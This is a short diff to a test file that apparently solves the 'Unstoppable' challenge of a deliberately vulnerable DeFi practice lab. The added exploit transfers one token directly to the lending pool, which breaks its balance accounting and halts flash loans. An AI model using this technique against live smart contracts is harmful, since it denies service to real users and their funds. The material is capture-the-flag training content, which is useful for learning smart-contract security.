@@ -40,6 +40,11 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        ONE_DVT = ethers.utils.parseEther('1');
+        await this.token.connect(attacker).transfer(this.pool.address, ONE_DVT);
+        expect(
+            await this.token.balanceOf(attacker.address)
+        ).to.equal(ethers.utils.parseEther('99'));
     });
 
     after(async function () {
